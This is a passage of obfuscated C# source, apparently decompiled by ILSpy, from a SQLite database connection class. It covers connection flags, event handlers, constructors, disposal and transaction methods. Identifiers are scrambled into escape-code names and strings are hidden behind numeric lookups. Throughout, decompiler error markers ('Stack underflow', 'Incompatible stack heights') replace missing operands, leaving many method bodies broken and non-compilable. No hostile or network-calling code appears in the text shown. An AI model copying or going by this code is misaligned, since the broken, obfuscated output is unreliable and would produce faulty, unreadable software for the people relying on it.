				object obj2 = global::_0011._0018._0001(_0091._0080_0004(typeof(SQLiteConnectionFlags).TypeHandle), global::_0002._007E_0006(obj), _0004: true);
				if (obj2 is SQLiteConnectionFlags)
				{
					return (SQLiteConnectionFlags)obj2;
				}
				return SQLiteConnectionFlags.Default;
			}
		}

		public static SQLiteConnectionFlags SharedFlags
		{
			get
			{
				_0091_0002 obj = _0091_0002._009C_0005;
				object obj2 = _0080.m__0001;
				object obj3 = default(object);
				if (0 == 0)
				{
					obj3 = obj2;
				}
				obj(obj2);
				try
				{
					return _0080.m__0002;
				}
				finally
				{
					_0091_0002._009D_0005(obj3);
				}
			}
			set
			{
				//IL_0019: Incompatible stack heights: 0 vs 1
				//IL_0029: Incompatible stack heights: 0 vs 2
				_ = _0091_0002._009C_0005;
				object obj = _0080.m__0001;
				/*Error near IL_0030: Stack underflow*/((object)/*Error near IL_0030: Stack underflow*/);
				try
				{
					_0080.m__0002 = (SQLiteConnectionFlags)/*Error near IL_0016: Stack underflow*/;
				}
				finally
				{
					_0091_0002._009D_0005(obj);
				}
			}
		}

		[DesignerSerializationVisibility(DesignerSerializationVisibility.Hidden)]
		[Browsable(false)]
		public override ConnectionState State
		{
			get
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0017: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0080)/*Error near IL_0014: Stack underflow*/);
				return ((_0080)/*Error near IL_000b: Stack underflow*/)._0001;
			}
		}

		protected override DbProviderFactory DbProviderFactory => _0082._0001;

		private static event global::_0014._0015 _handlers
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			add
			{
				//IL_001a: Incompatible stack heights: 0 vs 3
				//IL_0021: Incompatible stack heights: 0 vs 1
				_ = _0005_0002._009F_0004;
				_ = _0080.m__0001;
				/*Error near IL_0021: Stack underflow*/((Delegate)/*Error near IL_0021: Stack underflow*/, (Delegate)/*Error near IL_0021: Stack underflow*/);
				_0080.m__0001 = (global::_0014._0015)/*Error near IL_000f: Stack underflow*/;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			remove
			{
				//IL_001a: Incompatible stack heights: 0 vs 3
				//IL_0021: Incompatible stack heights: 0 vs 1
				_ = _0005_0002._0001_0005;
				_ = _0080.m__0001;
				/*Error near IL_0021: Stack underflow*/((Delegate)/*Error near IL_0021: Stack underflow*/, (Delegate)/*Error near IL_0021: Stack underflow*/);
				_0080.m__0001 = (global::_0014._0015)/*Error near IL_000f: Stack underflow*/;
			}
		}

		private event global::_0014._0016 _progressHandler
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			add
			{
				//IL_0021: Incompatible stack heights: 0 vs 1
				//IL_0024: Incompatible stack heights: 0 vs 2
				//IL_0027: Incompatible stack heights: 0 vs 2
				_ = _0005_0002._009F_0004;
				_ = ((_0080)/*Error near IL_000e: Stack underflow*/).m__0001;
				global::_0014._0016 obj = (global::_0014._0016)/*Error near IL_0015: Stack underflow*/((Delegate)/*Error near IL_0015: Stack underflow*/, (Delegate)/*Error near IL_0015: Stack underflow*/);
				((_0080)/*Error near IL_001f: Stack underflow*/).m__0001 = obj;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			remove
			{
				//IL_0021: Incompatible stack heights: 0 vs 1
				//IL_0024: Incompatible stack heights: 0 vs 2
				//IL_0027: Incompatible stack heights: 0 vs 2
				_ = _0005_0002._0001_0005;
				_ = ((_0080)/*Error near IL_000e: Stack underflow*/).m__0001;
				global::_0014._0016 obj = (global::_0014._0016)/*Error near IL_0015: Stack underflow*/((Delegate)/*Error near IL_0015: Stack underflow*/, (Delegate)/*Error near IL_0015: Stack underflow*/);
				((_0080)/*Error near IL_001f: Stack underflow*/).m__0001 = obj;
			}
		}

		private event global::_0018._001C _authorizerHandler
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			add
			{
				//IL_0021: Incompatible stack heights: 0 vs 1
				//IL_0024: Incompatible stack heights: 0 vs 2
				//IL_0027: Incompatible stack heights: 0 vs 2
				_ = _0005_0002._009F_0004;
				_ = ((_0080)/*Error near IL_000e: Stack underflow*/).m__0001;
				global::_0018._001C obj = (global::_0018._001C)/*Error near IL_0015: Stack underflow*/((Delegate)/*Error near IL_0015: Stack underflow*/, (Delegate)/*Error near IL_0015: Stack underflow*/);
				((_0080)/*Error near IL_001f: Stack underflow*/).m__0001 = obj;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			remove
			{
				//IL_0021: Incompatible stack heights: 0 vs 1
				//IL_0024: Incompatible stack heights: 0 vs 2
				//IL_0027: Incompatible stack heights: 0 vs 2
				_ = _0005_0002._0001_0005;
				_ = ((_0080)/*Error near IL_000e: Stack underflow*/).m__0001;
				global::_0018._001C obj = (global::_0018._001C)/*Error near IL_0015: Stack underflow*/((Delegate)/*Error near IL_0015: Stack underflow*/, (Delegate)/*Error near IL_0015: Stack underflow*/);
				((_0080)/*Error near IL_001f: Stack underflow*/).m__0001 = obj;
			}
		}

		private event global::_0005._0017 _updateHandler
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			add
			{
				//IL_0021: Incompatible stack heights: 0 vs 1
				//IL_0024: Incompatible stack heights: 0 vs 2
				//IL_0027: Incompatible stack heights: 0 vs 2
				_ = _0005_0002._009F_0004;
				_ = ((_0080)/*Error near IL_000e: Stack underflow*/).m__0001;
				global::_0005._0017 obj = (global::_0005._0017)/*Error near IL_0015: Stack underflow*/((Delegate)/*Error near IL_0015: Stack underflow*/, (Delegate)/*Error near IL_0015: Stack underflow*/);
				((_0080)/*Error near IL_001f: Stack underflow*/).m__0001 = obj;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			remove
			{
				//IL_0021: Incompatible stack heights: 0 vs 1
				//IL_0024: Incompatible stack heights: 0 vs 2
				//IL_0027: Incompatible stack heights: 0 vs 2
				_ = _0005_0002._0001_0005;
				_ = ((_0080)/*Error near IL_000e: Stack underflow*/).m__0001;
				global::_0005._0017 obj = (global::_0005._0017)/*Error near IL_0015: Stack underflow*/((Delegate)/*Error near IL_0015: Stack underflow*/, (Delegate)/*Error near IL_0015: Stack underflow*/);
				((_0080)/*Error near IL_001f: Stack underflow*/).m__0001 = obj;
			}
		}

		private event global::_0019._001E _commitHandler
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			add
			{
				//IL_0021: Incompatible stack heights: 0 vs 1
				//IL_0024: Incompatible stack heights: 0 vs 2
				//IL_0027: Incompatible stack heights: 0 vs 2
				_ = _0005_0002._009F_0004;
				_ = ((_0080)/*Error near IL_000e: Stack underflow*/).m__0001;
				global::_0019._001E obj = (global::_0019._001E)/*Error near IL_0015: Stack underflow*/((Delegate)/*Error near IL_0015: Stack underflow*/, (Delegate)/*Error near IL_0015: Stack underflow*/);
				((_0080)/*Error near IL_001f: Stack underflow*/).m__0001 = obj;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			remove
			{
				//IL_0021: Incompatible stack heights: 0 vs 1
				//IL_0024: Incompatible stack heights: 0 vs 2
				//IL_0027: Incompatible stack heights: 0 vs 2
				_ = _0005_0002._0001_0005;
				_ = ((_0080)/*Error near IL_000e: Stack underflow*/).m__0001;
				global::_0019._001E obj = (global::_0019._001E)/*Error near IL_0015: Stack underflow*/((Delegate)/*Error near IL_0015: Stack underflow*/, (Delegate)/*Error near IL_0015: Stack underflow*/);
				((_0080)/*Error near IL_001f: Stack underflow*/).m__0001 = obj;
			}
		}

		private event global::_000E._001C _traceHandler
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			add
			{
				//IL_0021: Incompatible stack heights: 0 vs 1
				//IL_0024: Incompatible stack heights: 0 vs 2
				//IL_0027: Incompatible stack heights: 0 vs 2
				_ = _0005_0002._009F_0004;
				_ = ((_0080)/*Error near IL_000e: Stack underflow*/).m__0001;
				global::_000E._001C obj = (global::_000E._001C)/*Error near IL_0015: Stack underflow*/((Delegate)/*Error near IL_0015: Stack underflow*/, (Delegate)/*Error near IL_0015: Stack underflow*/);
				((_0080)/*Error near IL_001f: Stack underflow*/).m__0001 = obj;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			remove
			{
				//IL_0021: Incompatible stack heights: 0 vs 1
				//IL_0024: Incompatible stack heights: 0 vs 2
				//IL_0027: Incompatible stack heights: 0 vs 2
				_ = _0005_0002._0001_0005;
				_ = ((_0080)/*Error near IL_000e: Stack underflow*/).m__0001;
				global::_000E._001C obj = (global::_000E._001C)/*Error near IL_0015: Stack underflow*/((Delegate)/*Error near IL_0015: Stack underflow*/, (Delegate)/*Error near IL_0015: Stack underflow*/);
				((_0080)/*Error near IL_001f: Stack underflow*/).m__0001 = obj;
			}
		}

		private event EventHandler _rollbackHandler
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			add
			{
				//IL_0021: Incompatible stack heights: 0 vs 1
				//IL_0024: Incompatible stack heights: 0 vs 2
				//IL_0027: Incompatible stack heights: 0 vs 2
				_ = _0005_0002._009F_0004;
				_ = ((_0080)/*Error near IL_000e: Stack underflow*/).m__0001;
				EventHandler obj = (EventHandler)/*Error near IL_0015: Stack underflow*/((Delegate)/*Error near IL_0015: Stack underflow*/, (Delegate)/*Error near IL_0015: Stack underflow*/);
				((_0080)/*Error near IL_001f: Stack underflow*/).m__0001 = obj;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			remove
			{
				//IL_0021: Incompatible stack heights: 0 vs 1
				//IL_0024: Incompatible stack heights: 0 vs 2
				//IL_0027: Incompatible stack heights: 0 vs 2
				_ = _0005_0002._0001_0005;
				_ = ((_0080)/*Error near IL_000e: Stack underflow*/).m__0001;
				EventHandler obj = (EventHandler)/*Error near IL_0015: Stack underflow*/((Delegate)/*Error near IL_0015: Stack underflow*/, (Delegate)/*Error near IL_0015: Stack underflow*/);
				((_0080)/*Error near IL_001f: Stack underflow*/).m__0001 = obj;
			}
		}

		public override event StateChangeEventHandler StateChange
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			add
			{
				//IL_0021: Incompatible stack heights: 0 vs 1
				//IL_0024: Incompatible stack heights: 0 vs 2
				//IL_0027: Incompatible stack heights: 0 vs 2
				_ = _0005_0002._009F_0004;
				_ = ((_0080)/*Error near IL_000e: Stack underflow*/)._0001;
				StateChangeEventHandler obj = (StateChangeEventHandler)/*Error near IL_0015: Stack underflow*/((Delegate)/*Error near IL_0015: Stack underflow*/, (Delegate)/*Error near IL_0015: Stack underflow*/);
				((_0080)/*Error near IL_001f: Stack underflow*/)._0001 = obj;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			remove
			{
				//IL_0021: Incompatible stack heights: 0 vs 1
				//IL_0024: Incompatible stack heights: 0 vs 2
				//IL_0027: Incompatible stack heights: 0 vs 2
				_ = _0005_0002._0001_0005;
				_ = ((_0080)/*Error near IL_000e: Stack underflow*/)._0001;
				StateChangeEventHandler obj = (StateChangeEventHandler)/*Error near IL_0015: Stack underflow*/((Delegate)/*Error near IL_0015: Stack underflow*/, (Delegate)/*Error near IL_0015: Stack underflow*/);
				((_0080)/*Error near IL_001f: Stack underflow*/)._0001 = obj;
			}
		}

		public static event global::_0014._0015 Changed
		{
			add
			{
				//IL_0047: Incompatible stack heights: 0 vs 3
				//IL_0057: Incompatible stack heights: 0 vs 2
				_ = _0091_0002._009C_0005;
				object obj = _0080.m__0001;
				/*Error near IL_005e: Stack underflow*/((object)/*Error near IL_005e: Stack underflow*/);
				try
				{
					_ = _0005_0002._0001_0005;
					_ = _0080.m__0001;
					_0080.m__0001 = (global::_0014._0015)/*Error near IL_0020: Stack underflow*/((Delegate)/*Error near IL_0020: Stack underflow*/, (Delegate)/*Error near IL_0020: Stack underflow*/);
					_0080.m__0001 = (global::_0014._0015)_0005_0002._009F_0004(_0080.m__0001, value);
				}
				finally
				{
					_0091_0002._009D_0005(obj);
				}
			}
			remove
			{
				//IL_002d: Incompatible stack heights: 0 vs 3
				//IL_003d: Incompatible stack heights: 0 vs 2
				_ = _0091_0002._009C_0005;
				object obj = _0080.m__0001;
				/*Error near IL_0044: Stack underflow*/((object)/*Error near IL_0044: Stack underflow*/);
				try
				{
					_ = _0005_0002._0001_0005;
					_ = _0080.m__0001;
					_0080.m__0001 = (global::_0014._0015)/*Error near IL_0020: Stack underflow*/((Delegate)/*Error near IL_0020: Stack underflow*/, (Delegate)/*Error near IL_0020: Stack underflow*/);
				}
				finally
				{
					_0091_0002._009D_0005(obj);
				}
			}
		}

		public event global::_0014._0016 Progress
		{
			add
			{
				//IL_0057: Incompatible stack heights: 0 vs 1
				//IL_0061: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0080)/*Error near IL_005e: Stack underflow*/);
				if (((_0080)/*Error near IL_000b: Stack underflow*/).m__0001 == null)
				{
					this.m__0001 = _0001;
					if (this._0001 != null)
					{
						this._0001._0001(this._0016, this.m__0001);
					}
				}
				this.m__0001 = (global::_0014._0016)Delegate.Combine(this.m__0001, value);
			}
			remove
			{
				//IL_0042: Incompatible stack heights: 0 vs 1
				//IL_004c: Incompatible stack heights: 0 vs 3
				global::_0011._0018._0001((_0080)/*Error near IL_0049: Stack underflow*/);
				_ = this.m__0001;
				global::_0014._0016 obj = (global::_0014._0016)Delegate.Remove((Delegate?)/*Error near IL_0012: Stack underflow*/, (Delegate?)/*Error near IL_0012: Stack underflow*/);
				((_0080)/*Error near IL_001c: Stack underflow*/).m__0001 = obj;
				if (this.m__0001 == null)
				{
					if (this._0001 != null)
					{
						this._0001._0001(0, null);
					}
					this.m__0001 = null;
				}
			}
		}

		public event global::_0018._001C Authorize
		{
			add
			{
				//IL_0051: Incompatible stack heights: 0 vs 1
				//IL_005b: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0080)/*Error near IL_0058: Stack underflow*/);
				if (((_0080)/*Error near IL_000b: Stack underflow*/).m__0001 == null)
				{
					this.m__0001 = _0001;
					if (this._0001 != null)
					{
						this._0001._0001(this.m__0001);
					}
				}
				this.m__0001 = (global::_0018._001C)Delegate.Combine(this.m__0001, value);
			}
			remove
			{
				//IL_0041: Incompatible stack heights: 0 vs 1
				//IL_004b: Incompatible stack heights: 0 vs 3
				global::_0011._0018._0001((_0080)/*Error near IL_0048: Stack underflow*/);
				_ = this.m__0001;
				global::_0018._001C obj = (global::_0018._001C)Delegate.Remove((Delegate?)/*Error near IL_0012: Stack underflow*/, (Delegate?)/*Error near IL_0012: Stack underflow*/);
				((_0080)/*Error near IL_001c: Stack underflow*/).m__0001 = obj;
				if (this.m__0001 == null)
				{
					if (this._0001 != null)
					{
						this._0001._0001((global::_0019._001D)null);
					}
					this.m__0001 = null;
				}
			}
		}

		public event global::_0005._0017 Update
		{
			add
			{
				//IL_0051: Incompatible stack heights: 0 vs 1
				//IL_005b: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0080)/*Error near IL_0058: Stack underflow*/);
				if (((_0080)/*Error near IL_000b: Stack underflow*/).m__0001 == null)
				{
					this.m__0001 = _0001;
					if (this._0001 != null)
					{
						this._0001._0001(this.m__0001);
					}
				}
				this.m__0001 = (global::_0005._0017)Delegate.Combine(this.m__0001, value);
			}
			remove
			{
				//IL_0041: Incompatible stack heights: 0 vs 1
				//IL_004b: Incompatible stack heights: 0 vs 3
				global::_0011._0018._0001((_0080)/*Error near IL_0048: Stack underflow*/);
				_ = this.m__0001;
				global::_0005._0017 obj = (global::_0005._0017)Delegate.Remove((Delegate?)/*Error near IL_0012: Stack underflow*/, (Delegate?)/*Error near IL_0012: Stack underflow*/);
				((_0080)/*Error near IL_001c: Stack underflow*/).m__0001 = obj;
				if (this.m__0001 == null)
				{
					if (this._0001 != null)
					{
						this._0001._0001((global::_0018._001B)null);
					}
					this.m__0001 = null;
				}
			}
		}

		public event global::_0019._001E Commit
		{
			add
			{
				//IL_0051: Incompatible stack heights: 0 vs 1
				//IL_005b: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0080)/*Error near IL_0058: Stack underflow*/);
				if (((_0080)/*Error near IL_000b: Stack underflow*/).m__0001 == null)
				{
					this.m__0001 = this._0001;
					if (this._0001 != null)
					{
						this._0001._0001(this.m__0001);
					}
				}
				this.m__0001 = (global::_0019._001E)Delegate.Combine(this.m__0001, value);
			}
			remove
			{
				//IL_0041: Incompatible stack heights: 0 vs 1
				//IL_004b: Incompatible stack heights: 0 vs 3
				global::_0011._0018._0001((_0080)/*Error near IL_0048: Stack underflow*/);
				_ = this.m__0001;
				global::_0019._001E obj = (global::_0019._001E)Delegate.Remove((Delegate?)/*Error near IL_0012: Stack underflow*/, (Delegate?)/*Error near IL_0012: Stack underflow*/);
				((_0080)/*Error near IL_001c: Stack underflow*/).m__0001 = obj;
				if (this.m__0001 == null)
				{
					if (this._0001 != null)
					{
						this._0001._0001((_0081)null);
					}
					this.m__0001 = null;
				}
			}
		}

		public event global::_000E._001C Trace
		{
			add
			{
				//IL_0051: Incompatible stack heights: 0 vs 1
				//IL_005b: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0080)/*Error near IL_0058: Stack underflow*/);
				if (((_0080)/*Error near IL_000b: Stack underflow*/).m__0001 == null)
				{
					this.m__0001 = _0001;
					if (this._0001 != null)
					{
						this._0001._0001(this.m__0001);
					}
				}
				this.m__0001 = (global::_000E._001C)Delegate.Combine(this.m__0001, value);
			}
			remove
			{
				//IL_0041: Incompatible stack heights: 0 vs 1
				//IL_004b: Incompatible stack heights: 0 vs 3
				global::_0011._0018._0001((_0080)/*Error near IL_0048: Stack underflow*/);
				_ = this.m__0001;
				global::_000E._001C obj = (global::_000E._001C)Delegate.Remove((Delegate?)/*Error near IL_0012: Stack underflow*/, (Delegate?)/*Error near IL_0012: Stack underflow*/);
				((_0080)/*Error near IL_001c: Stack underflow*/).m__0001 = obj;
				if (this.m__0001 == null)
				{
					if (this._0001 != null)
					{
						this._0001._0001((global::_0010._001D)null);
					}
					this.m__0001 = null;
				}
			}
		}

		public event EventHandler RollBack
		{
			add
			{
				//IL_0051: Incompatible stack heights: 0 vs 1
				//IL_005b: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0080)/*Error near IL_0058: Stack underflow*/);
				if (((_0080)/*Error near IL_000b: Stack underflow*/).m__0001 == null)
				{
					this.m__0001 = this._0001;
					if (this._0001 != null)
					{
						this._0001._0001(this.m__0001);
					}
				}
				this.m__0001 = (EventHandler)Delegate.Combine(this.m__0001, value);
			}
			remove
			{
				//IL_0041: Incompatible stack heights: 0 vs 1
				//IL_004b: Incompatible stack heights: 0 vs 3
				global::_0011._0018._0001((_0080)/*Error near IL_0048: Stack underflow*/);
				_ = this.m__0001;
				EventHandler obj = (EventHandler)Delegate.Remove((Delegate?)/*Error near IL_0012: Stack underflow*/, (Delegate?)/*Error near IL_0012: Stack underflow*/);
				((_0080)/*Error near IL_001c: Stack underflow*/).m__0001 = obj;
				if (this.m__0001 == null)
				{
					if (this._0001 != null)
					{
						this._0001._0001((global::_0010._001E)null);
					}
					this.m__0001 = null;
				}
			}
		}

		public _0080()
			: this((string)null)
		{
		}

		public _0080(string _0098_0017_0006)
			: this(_0098_0017_0006, _0096_0019_0006: false)
		{
		}

		internal _0080(IntPtr _0091_0016_0006, string _0089_0015, bool _000F_0017_0006)
			: this()
		{
			this._0001 = new global::_0002._0019(SQLiteDateFormats.ISO8601, DateTimeKind.Unspecified, null, _0091_0016_0006, _0089_0015, _000F_0017_0006);
			this._0003 = SQLiteConnectionFlags.None;
			this._0001 = ((_0091_0016_0006 != IntPtr.Zero) ? ConnectionState.Open : ConnectionState.Closed);
			this._0012 = null;
		}

		public _0080(string _0098_0017_0006, bool _0096_0019_0006)
		{
			this._0013 = false;
			global::_0011._0018._0001();
			global::_0011._0018._0001();
			this._0001 = new Dictionary<string, object>(new global::_007F._0018());
			this._0001 = new global::_0001._001D();
			this._0001 = new global::_000F._0013();
			_0015 = _0096_0019_0006;
			this._0003 = SQLiteConnectionFlags.None;
			this.m__0001 = null;
			this._0015 = null;
			this._0016 = null;
			this._0001 = ConnectionState.Closed;
			this._0012 = null;
			if (_0098_0017_0006 != null)
			{
				ConnectionString = _0098_0017_0006;
			}
		}

		public _0080(_0080 _001B_0013_0006)
			: this(_001B_0013_0006.ConnectionString, _001B_0013_0006.ParseViaFramework)
		{
			if (_001B_0013_0006.State != ConnectionState.Open)
			{
				return;
			}
			Open();
			using DataTable dataTable = _001B_0013_0006.GetSchema(global::_0080._0014._0001(107401820));
			foreach (DataRow row in dataTable.Rows)
			{
				string strA = row[0].ToString();
				if (string.Compare(strA, global::_0080._0014._0001(107401775), StringComparison.OrdinalIgnoreCase) != 0 && string.Compare(strA, global::_0080._0014._0001(107401766), StringComparison.OrdinalIgnoreCase) != 0)
				{
					using global::_0010._001C obj = global::_0011._0018._0001(this);
					obj.CommandText = global::_0011._0018._0001((IFormatProvider)CultureInfo.InvariantCulture, global::_0080._0014._0001(107401789), new object[2]
					{
						row[1],
						row[0]
					});
					obj.ExecuteNonQuery();
				}
			}
		}

		internal static void _0001(_0080 _0002, global::_0002._001A _0003)
		{
			//IL_005c: Incompatible stack heights: 0 vs 1
			//IL_005f: Incompatible stack heights: 0 vs 2
			//IL_0066: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ != 0)
			{
				_ = global::_001B._007E_008D_0003;
				/*Error near IL_0066: Stack underflow*/((object)/*Error near IL_0066: Stack underflow*/);
				if ((int)/*Error near IL_000f: Stack underflow*/ == 0)
				{
					return;
				}
			}
			object obj;
			_0091_0002._009C_0005(obj = _0080.m__0001);
			global::_0014._0015 obj2;
			try
			{
				obj2 = ((_0080.m__0001 == null) ? null : (_0083_0003._007E_001B_0007(_0080.m__0001) as global::_0014._0015));
			}
			finally
			{
				_0091_0002._009D_0005(obj);
			}
			obj2?.Invoke(_0002, _0003);
		}

		public Dictionary<string, object> _0001()
		{
			//IL_00c6: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_0080)/*Error near IL_00d0: Stack underflow*/);
			Dictionary<string, object> result = null;
			if (this._0001 != null)
			{
				result = new Dictionary<string, object>(this._0001.Count, this._0001.Comparer);
				{
					foreach (KeyValuePair<string, global::_0006._0018> item in this._0001)
					{
						global::_0006._0018 value = item.Value;
						object obj = null;
						object obj2 = null;
						object obj3 = null;
						if (value != null)
						{
							obj = value._0001;
							obj2 = value._0001;
							obj3 = value._0001;
						}
						result.Add(item.Key, new object[3] { obj, obj2, obj3 });
					}
					return result;
				}
			}
			return result;
		}

		[Conditional("CHECK_STATE")]
		internal static void _0001(_0080 _0002)
		{
			//IL_00ab: Incompatible stack heights: 0 vs 1
			//IL_00b5: Incompatible stack heights: 0 vs 1
			//IL_00bf: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0007: Stack underflow*/ == 0)
			{
				global::_0080._0014._0001(107401748);
				new ArgumentNullException((string?)/*Error near IL_00bf: Stack underflow*/);
				throw /*Error near IL_0017: Stack underflow*/;
			}
			global::_0011._0018._0001(_0002);
			if (_0002._0001 != ConnectionState.Open)
			{
				throw new InvalidOperationException(global::_0080._0014._0001(107402211));
			}
			if (!(_0002._0001 is global::_0002._0019 obj))
			{
				throw new InvalidOperationException(global::_0080._0014._0001(107402206));
			}
			global::_000E._001F obj2 = obj._0001;
			if (obj2 == null)
			{
				throw new InvalidOperationException(global::_0080._0014._0001(107402121));
			}
			if (global::_001B._007E_008A_0003(obj2))
			{
				throw new InvalidOperationException(global::_0080._0014._0001(107402080));
			}
			if (global::_001B._007E_008B_0003(obj2))
			{
				throw new InvalidOperationException(global::_0080._0014._0001(107402067));
			}
		}

		private void _0001(SortedList<string, string> _0002)
		{
			//IL_00e4: Incompatible stack heights: 0 vs 1
			//IL_00ea: Incompatible stack heights: 0 vs 1
			//IL_00f4: Incompatible stack heights: 0 vs 1
			_ = typeof(SQLiteDateFormats);
			global::_0080._0014._0001(107401990);
			object obj3 = global::_0011._0018._0001(_0003: global::_0011._0018._0001(_0004: SQLiteDateFormats.ISO8601.ToString(), _0002: (SortedList<string, string>)/*Error near IL_0029: Stack underflow*/, _0003: (string)/*Error near IL_0029: Stack underflow*/), _0002: (Type)/*Error near IL_002f: Stack underflow*/, _0004: true);
			SQLiteDateFormats sQLiteDateFormats = ((!(obj3 is SQLiteDateFormats)) ? SQLiteDateFormats.ISO8601 : ((SQLiteDateFormats)obj3));
			obj3 = global::_0011._0018._0001(typeof(DateTimeKind), global::_0011._0018._0001(_0002, global::_0080._0014._0001(107402001), DateTimeKind.Unspecified.ToString()), _0004: true);
			DateTimeKind dateTimeKind = ((obj3 is DateTimeKind) ? ((DateTimeKind)obj3) : DateTimeKind.Unspecified);
			string text = global::_0011._0018._0001(_0002, global::_0080._0014._0001(107401440), (string)null);
			if (global::_0001._001A._0001(global::_0011._0018._0001(_0002, global::_0080._0014._0001(107401411), false.ToString())))
			{
				this._0001 = new global::_0016._001A(sQLiteDateFormats, dateTimeKind, text, IntPtr.Zero, null, _000F_0017_0006: false);
			}
			else
			{
				this._0001 = new global::_0002._0019(sQLiteDateFormats, dateTimeKind, text, IntPtr.Zero, null, _000F_0017_0006: false);
			}
		}

		public void _0001()
		{
			//IL_0015: Incompatible stack heights: 0 vs 1
			//IL_0018: Incompatible stack heights: 0 vs 2
			if (!((_0080)/*Error near IL_0007: Stack underflow*/)._0013)
			{
				_ = global::_0008._000F_0002;
				/*Error near IL_001f: Stack underflow*/((object)/*Error near IL_001f: Stack underflow*/);
			}
		}

		void IDisposable.Dispose()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0001();
		}

		protected override void _0001(bool _0002)
		{
			//IL_0082: Incompatible stack heights: 0 vs 1
			//IL_0088: Incompatible stack heights: 0 vs 1
			//IL_0092: Incompatible stack heights: 0 vs 2
			if ((((_0080)/*Error near IL_0007: Stack underflow*/)._0003 & SQLiteConnectionFlags.TraceWarning) == SQLiteConnectionFlags.TraceWarning && ((_0080)/*Error near IL_001d: Stack underflow*/)._0013)
			{
				_ = _0015_0004._001E_0008;
				_008F_0003._008C_0007();
				string obj3 = global::_0011._0018._0001(_0003: global::_0080._0014._0001(107401386), _0004: new object[1] { this._0012 }, _0002: (IFormatProvider)/*Error near IL_004b: Stack underflow*/);
				/*Error near IL_0050: Stack underflow*/(obj3);
			}
			this._0014 = true;
			try
			{
				if (!_0017)
				{
					global::_0008._007E_0010_0002(this);
				}
			}
			finally
			{
				global::_0005._008C(this, _0002);
				_0017 = true;
			}
		}

		public object _0001()
		{
			//IL_000d: Incompatible stack heights: 0 vs 1
			//IL_0017: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_0080)/*Error near IL_0014: Stack underflow*/);
			return new _0080((_0080)/*Error near IL_000b: Stack underflow*/);
		}

		object ICloneable.Clone()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			return this._0001();
		}

		[Obsolete("Use one of the standard BeginTransaction methods, this one will be removed soon")]
		public global::_0010._007F _0001(System.Data.IsolationLevel _0002, bool _0003)
		{
			//IL_0021: Incompatible stack heights: 0 vs 1
			//IL_002b: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_0080)/*Error near IL_0028: Stack underflow*/);
			return (global::_0010._007F)((DbConnection)/*Error near IL_001a: Stack underflow*/).BeginDbTransaction((!_0003) ? System.Data.IsolationLevel.Serializable : System.Data.IsolationLevel.ReadCommitted);
		}

		[Obsolete("Use one of the standard BeginTransaction methods, this one will be removed soon")]
		public global::_0010._007F _0001(bool _0002)
		{
			//IL_0021: Incompatible stack heights: 0 vs 1
			//IL_002b: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_0080)/*Error near IL_0028: Stack underflow*/);
			return (global::_0010._007F)((DbConnection)/*Error near IL_001a: Stack underflow*/).BeginDbTransaction((!_0002) ? System.Data.IsolationLevel.Serializable : System.Data.IsolationLevel.ReadCommitted);
		}

		public global::_0010._007F _0001(System.Data.IsolationLevel _0002)
		{
			//IL_0018: Incompatible stack heights: 0 vs 1
			//IL_0022: Incompatible stack heights: 0 vs 2
			global::_0011._0018._0001((_0080)/*Error near IL_001f: Stack underflow*/);
			_ = _0016_0004._007E_0080_0008;
			return (global::_0010._007F)/*Error near IL_0011: Stack underflow*/((object)/*Error near IL_0011: Stack underflow*/, _0002);
		}

		public global::_0010._007F _0001()
		{
			//IL_001d: Incompatible stack heights: 0 vs 1
			//IL_0027: Incompatible stack heights: 0 vs 2
			global::_0011._0018._0001((_0080)/*Error near IL_0024: Stack underflow*/);
			_ = _0016_0004._007E_0080_0008;
			System.Data.IsolationLevel num = _0004;
			return (global::_0010._007F)/*Error near IL_0016: Stack underflow*/((object)/*Error near IL_0016: Stack underflow*/, num);
		}

		protected override DbTransaction _0001(System.Data.IsolationLevel _0002)
		{
			//IL_0019: Invalid comparison between Unknown and I4
			//IL_00a3: Incompatible stack heights: 0 vs 1
			//IL_00ad: Incompatible stack heights: 0 vs 1
			//IL_00b3: Incompatible stack heights: 0 vs 1
			if (((_0080)/*Error near IL_000a: Stack underflow*/)._0001 != ConnectionState.Open)
			{
				new InvalidOperationException();
				throw /*Error near IL_0013: Stack underflow*/;
			}
			if ((int)/*Error near IL_001b: Stack underflow*/ == -1)
			{
				_0002 = _0004;
			}
			_0002 = global::_0011._0018._0001(this, _0002);
			if (_0002 != System.Data.IsolationLevel.Serializable && _0002 != System.Data.IsolationLevel.ReadCommitted)
			{
				throw new ArgumentException(global::_0080._0014._0001(107401293));
			}
			global::_0010._007F obj = (((this._0003 & SQLiteConnectionFlags.AllowNestedTransactions) != SQLiteConnectionFlags.AllowNestedTransactions) ? new global::_0010._007F(this, _0002 != System.Data.IsolationLevel.Serializable) : new global::_0016._001D(this, _0002 != System.Data.IsolationLevel.Serializable));
